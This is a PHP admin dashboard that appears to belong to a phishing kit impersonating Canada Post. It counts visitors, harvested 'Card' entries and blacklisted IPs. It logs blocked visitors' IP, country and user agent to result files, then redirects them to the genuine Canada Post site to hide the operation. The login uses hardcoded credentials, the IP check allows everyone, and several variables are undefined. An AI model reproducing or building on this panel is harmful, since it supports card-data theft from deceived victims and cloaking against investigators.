<?php

// Function to get the client's IP address
function getIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ini_array = parse_ini_file("setting.ini");
$whitelistedIp = strval($ini_array['WhitelistedIp']);
$ip = getIpAddress();

function isAllowedIP($ip) {
    // Allow all IP addresses
    return true;
}

function getCountry($ip) {
    $ip_data = @json_decode(file_get_contents("http://ipwho.is/{$ip}"));
    $country = $ip_data->country_code ?? "Unknown";
    return $country;
}

$countryyy = getCountry($ip);

if ($whitelistedIp == $ip || isAllowedIP($ip, $allowedIPs)) {
    error_reporting(0);
    session_start();

    function login($username, $password) {
        if ($username == '123' && $password == '12345') {  // Login Infos
            return 'valid';
        } else {
            return 'invalid';
        }
    }

    if (isset($_POST['login-password'])) {
        $login = login($_POST['login-username'], $_POST['login-password']);
        if ($login == "valid") {
            $_SESSION['login-username'] = $_POST['login-username'];
            $_SESSION['login-password'] = $_POST['login-password'];
            echo "<script type='text/javascript'>window.top.location='Dashboard.php';</script>";
            exit();
        } else {
            $errorMsg = urlencode("Username or Password is incorrect.");
            header("Location: ?p=fail&msg={$errorMsg}");
            exit();
        }
    }
} else {
    $os = $_SERVER['HTTP_USER_AGENT'];
    date_default_timezone_set('America/Edmonton');

    $jam = date("Y/m/d H:i");
    $blockedMessage = "{$ip}|{$countryyy}|{$jam}|{$os}|访问管理员面板被阻止(Access to the admin panel is blocked)\n";

    file_put_contents("../result/total_Blocked.txt", $blockedMessage, FILE_APPEND);
    file_put_contents("../result/dieip.txt", "{$ip}\n", FILE_APPEND);
    header("Location: https://www.canadapost-postescanada.ca/cpc/en/home.page");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EchoPAGE - Dashboard</title>
    <meta name="description" content="Dashmix - Bootstrap 5 Admin Template & UI Framework created by pixelcave and published on Themeforest">
    <meta name="author" content="pixelcave">
    <meta name="robots" content="noindex, nofollow">
    <!-- Open Graph Meta -->
    <meta property="og:title" content="Dashmix - Bootstrap 5 Admin Template & UI Framework">
    <meta property="og:site_name" content="Dashmix">
    <meta property="og:description" content="Dashmix - Bootstrap 5 Admin Template & UI Framework created by pixelcave and published on Themeforest">
    <meta property="og:type" content="website">
    <meta property="og:url" content="">
    <meta property="og:image" content="">
    <!-- Icons -->
    <!-- The following icons can be replaced with your own; they are used by desktop and mobile browsers -->
    <link rel="shortcut icon" href="img/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="img/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="img/apple-touch-icon-180x180.png">
    <!-- END Icons -->
    <!-- Stylesheets -->
    <!-- Fonts and Dashmix framework -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap">
    <link rel="stylesheet" id="css-main" href="css/dashmix.min.css" />
    <!-- Custom Styles for Dark Theme -->
    <style>
        body {
            background-color: #333; /* Dark background color */
            color: #fff; /* Light text color */
        }
        /* Add your custom dark theme styles here */
    </style>
    <!-- Custom Styles for Pagination -->
    <style>
        .hide {
            display: none;
            visibility: hidden;
            height: 0;
        }

        .pagination\:container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 10px;
        }

        .arrow\:text {
            display: block;
            vertical-align: middle;
            font-size: 13px;
            vertical-align: middle;
        }

        .pagination\:number {
            --size: 32px;
            --margin: 6px;
            margin: 0 var(--margin);
            border-radius: 6px;
            background: #202020;
            max-width: auto;
            min-width: var(--size);
            height: var(--size);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            padding: 0 6px;
            color: white;
            @media (hover: hover) {
                &:hover {
                    background: lighten(#202020, 3%);
                }
            }
            &:active {
                background: lighten(#202020, 3%);
            }
        }

        .pagination\:active {
            background: lighten(#202020, 3%);
            position: relative;
        }
    </style>
    <!-- END Stylesheets -->
</head>
<body>
<div id="page-container" class="page-header-dark main-content-boxed">
    <!-- Header -->
    <!-- Add your header content here -->
    <!-- END Header -->
    <!-- Main Container -->
    <main id="main-container">
        <!-- Navigation -->
        <div class="bg-sidebar-dark">
            <div class="content">
                <!-- Toggle Main Navigation -->
                <div class="d-lg-none push">
                    <!-- Class Toggle, functionality initialized in Helpers.dmToggleClass() -->
                    <button
                            type="button"
                            class="btn w-100 btn-primary d-flex justify-content-between align-items-center"
                            data-toggle="class-toggle"
                            data-target="#main-navigation"
                            data-class="d-none"
                    >
                        Menu <i class="fa fa-bars"></i>
                    </button>
                </div>
                <!-- END Toggle Main Navigation -->
                <!-- Main Navigation -->
                <div id="main-navigation" class="d-none d-lg-block push">
                    <ul class="nav-main nav-main-horizontal nav-main-hover nav-main-dark">
                        <li class="nav-main-item">
                            <a class="nav-main-link active" href="Dashboard.php">
                                <i class="nav-main-link-icon fa fa-compass"></i>
                                <span class="nav-main-link-name">Dashboard</span>
                            </a>
                        </li>
                        <li class="nav-main-item">
                            <a class="nav-main-link" href="User.php">
                                <i class="nav-main-link-icon fa fa-user-friends"></i>
                                <span class="nav-main-link-name">User list</span>
                            </a>
                        </li>
                        <li class="nav-main-item">
                            <a class="nav-main-link" href="Blocklist.php">
                                <i class="nav-main-link-icon fa fa-ghost"></i>
                                <span class="nav-main-link-name">Block list</span>
                            </a>
                        </li>
                        <li class="nav-main-heading">Extra</li>
                        <li class="nav-main-item ms-lg-auto">
                            <a class="nav-main-link" href="Reset.php">
                                <i class="fa fa-bolt text-muted me-1"></i>
                                <span class="nav-main-link-name">Reset data</span>
                            </a>
                        </li>
                        <li class="nav-main-item">
                            <a class="nav-main-link" href="Logout.php">
                                <i class="nav-main-link-icon fa fa-coffee"></i>
                                <span class="nav-main-link-name">Log out</span>
                            </a>
                        </li>
                    </ul>
                </div>
                <!-- END Main Navigation -->
            </div>
        </div>
        <!-- END Navigation -->
        <!-- Page Content -->
        <div class="content">
            <!-- Quick Stats -->
            <div class="row">
                <div class="col-md-6 col-xl-3">
                    <a class="block block-rounded block-link-pop" href="javascript:void(0)">
                        <div class="block-content block-content-full d-flex align-items-center justify-content-between">
                            <i class="far fa-2x fa-circle-user"></i>
                            <div class="ms-3 text-end">
                                <p class="text-muted mb-0">Users</p>
                                <p class="fs-3 mb-0"><?php echo $log_visitor;?></p>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-6 col-xl-3">
                    <a class="block block-rounded block-link-pop" href="javascript:void(0)">
                        <div class="block-content block-content-full d-flex align-items-center justify-content-between">
                            <i class="far fa-2x fa-closed-captioning"></i>
                            <div class="ms-3 text-end">
                                <p class="text-muted mb-0">Card</p>
                                <p class="fs-3 mb-0"><?php echo $cc;?></p>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-6 col-xl-3">
                    <a class="block block-rounded block-link-pop" href="javascript:void(0)">
                        <div class="block-content block-content-full d-flex align-items-center justify-content-between">
                            <i class="far fa-2x fa-eye-slash"></i>
                            <div class="ms-3 text-end">
                                <p class="text-muted mb-0">Block</p>
                                <p class="fs-3 mb-0"><?php echo $total_countryBlocked;?></p>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-md-6 col-xl-3">
                    <a class="block block-rounded block-link-pop" href="javascript:void(0)">
                        <div class="block-content block-content-full d-flex align-items-center justify-content-between">
                            <i class="si si-globe fa-2x"></i>
                            <div class="ms-3 text-end">
                                <p class="text-muted mb-0">Blacklistip</p>
                                <p class="fs-3 mb-0"><?php echo $dieip;?></p>
                            </div>
                        </div>
                    </a>
                </div>
            </div>
            <!-- END Quick Stats -->

            <!-- Contact List -->
            <div class="block block-rounded block-mode-loading-refresh">
                <!-- Add your contact list content here -->
            </div>
            <!-- END Contact List -->

            <!-- Other Features -->
            <div class="block block-rounded block-mode-loading-refresh">
                <!-- Add your other features content here -->
            </div>
            <!-- END Other Features -->
        </div>
        <!-- END Page Content -->
    </main>
    <!-- END Main Container -->
</div>
<!-- END Page Container -->

<!--
  Dashmix JS
  Core libraries and functionality
  webpack is putting everything together at assets/_js/main/app.js
-->
<script src="js/dashmix.app.min.js"></script>

<!-- jQuery (required for jQuery Sparkline plugin) -->
<script src="js/jquery.min.js"></script>

<!-- Page JS Plugins -->
<script src="js/jquery.sparkline.min.js"></script>
<script src="js/chart.min.js"></script>

<!-- Page JS Code -->
<script src="js/be_pages_dashboard_v1.min.js"></script>
<!-- Page JS Helpers(jQuery Sparkline plugin) -->
</body>
</html>
